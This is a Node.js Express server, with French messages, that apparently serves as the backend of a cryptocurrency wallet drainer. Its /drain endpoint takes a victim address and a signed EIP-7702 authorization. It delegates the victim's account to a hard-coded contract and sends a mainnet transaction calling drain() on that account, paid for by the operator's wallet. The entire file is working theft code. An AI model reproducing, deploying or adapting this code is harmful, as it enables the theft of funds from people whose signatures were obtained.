import express from "express";
import cors from "cors";
import { JsonRpcProvider, Wallet, Interface } from "ethers";

const RPC = process.env.RPC_URL;
const PK = process.env.PRIVATE_KEY;
const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";

const provider = new JsonRpcProvider(RPC);
const wallet = new Wallet(PK, provider);
const iface = new Interface(["function drain()"]);

const clean = (h) => (typeof h === "string" && h.startsWith("0x") ? h.slice(2) : h);

const app = express();
app.use(cors());
app.use(express.json());

app.post("/drain", async (req, res) => {
  try {
    const { fantome, auth } = req.body;
    if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });

    console.log("AUTH RECU:", JSON.stringify(auth));

    if (!auth.r || !auth.s) {
      return res.status(400).json({ error: "r ou s manquant dans auth" });
    }

    let yp = auth.yParity;
    if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
    yp = Number(yp);
    if (yp >= 27) yp = yp - 27;

    // Nonce de l'autorisation = nonce actuel de l'adresse fantome, lu juste avant
    const authNonce = await provider.getTransactionCount(fantome, "latest");

    const authorization = {
      chainId: BigInt(auth.chainId),
      address: CONTRACT,
      nonce: BigInt(authNonce),
      yParity: yp,
      r: "0x" + clean(auth.r),
      s: "0x" + clean(auth.s),
    };

    const nonce = await provider.getTransactionCount(wallet.address, "latest");
    const fee = await provider.getFeeData();

    const tx = {
      type: 4,
      chainId: 1,
      to: fantome,
      value: 0n,
      data: iface.encodeFunctionData("drain"),
      nonce,
      maxFeePerGas: fee.maxFeePerGas,
      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
      gasLimit: 300000n,
      authorizationList: [authorization],
    };

    const sent = await wallet.sendTransaction(tx);
    res.json({ hash: sent.hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.get("/", (_, res) => res.send("majordome ok"));
app.listen(process.env.PORT || 3000);
